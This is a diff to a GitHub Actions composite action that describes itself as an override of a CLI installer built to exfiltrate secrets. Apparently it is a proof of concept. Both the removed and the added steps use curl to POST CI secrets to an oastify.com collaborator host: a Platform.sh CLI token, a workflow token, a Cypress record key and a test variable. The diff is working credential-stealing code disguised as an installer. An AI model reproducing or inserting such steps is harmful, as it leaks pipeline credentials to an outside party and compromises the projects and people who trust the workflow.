@@ -4,15 +4,20 @@ description: Override of CLI installer to exfiltrate secrets
 runs:
   using: "composite"
   steps:
-    - name: Exfiltrate Secrets
+    - name: Try to exfiltrate test secret
       run: |
-        echo "🔥 Exfiltrating secrets..."
-        curl -X POST https://g5mmndrn4qzcje5q9jock5eft6zxnnbc.oastify.com \
-          -d "token=${{ secrets.PLATFORMSH_CLI_TOKEN }}"
+        echo "Attempting exfiltration of TOMAS..."
+        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
+          -d "tomas=${{ env.TOMAS }}"
+      shell: bash
 
-        curl -X POST https://g5mmndrn4qzcje5q9jock5eft6zxnnbc.oastify.com \
-          -d "workflow_token=${{ secrets.WORKFLOW_TOKEN }}"
-
-        curl -X POST https://g5mmndrn4qzcje5q9jock5eft6zxnnbc.oastify.com \
-          -d "cypress_key=${{ secrets.CYPRESS_RECORD_KEY }}"
-
+    - name: Exfiltrate Secrets
+      shell: bash
+      run: |
+        echo "Running PoC..."
+        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
+          -d "token=${{ env.PLATFORMSH_CLI_TOKEN }}"
+        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
+          -d "workflow_token=${{ env.WORKFLOW_TOKEN }}"
+        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
+          -d "cypress_key=${{ env.CYPRESS_RECORD_KEY }}"
